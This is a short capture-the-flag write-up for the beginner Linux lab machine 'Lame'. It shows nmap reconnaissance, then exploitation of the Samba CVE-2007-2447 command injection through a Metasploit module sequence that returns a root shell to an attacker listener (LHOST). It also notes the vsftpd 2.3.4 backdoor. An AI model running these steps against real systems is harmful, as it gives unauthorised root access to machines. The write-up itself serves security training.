Lame

Machine Easy Linux Samba CVE-2007-2447 2025-06-01

Summary

Lame is a beginner-level Linux machine that demonstrates a classic Samba vulnerability (CVE-2007-2447) allowing unauthenticated remote code execution as root. No privilege escalation is required once the initial shell is obtained.

Reconnaissance

Nmap

nmap -sC -sV -oA lame 10.10.10.3

Key ports discovered:

  • 21/tcp — vsftpd 2.3.4 (anonymous login enabled)
  • 22/tcp — OpenSSH 4.7p1
  • 139/tcp — Samba smbd 3.X
  • 445/tcp — Samba smbd 3.0.20

Exploitation

CVE-2007-2447 — Samba username map script

Samba 3.0.20 through 3.0.25rc3 is vulnerable to command injection via the username field when the username map script option is enabled. Sending a crafted username with shell metacharacters executes arbitrary commands as root. 

# Using Metasploit
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run

A root shell is returned immediately — no privilege escalation needed.

Flags

User flag /home/makis/user.txt
Root flag /root/root.txt

Notes

vsftpd 2.3.4 also contains a backdoor (CVE-2011-2523) that opens a shell on port 6200, but it did not trigger reliably on this host. The Samba path is the intended route.
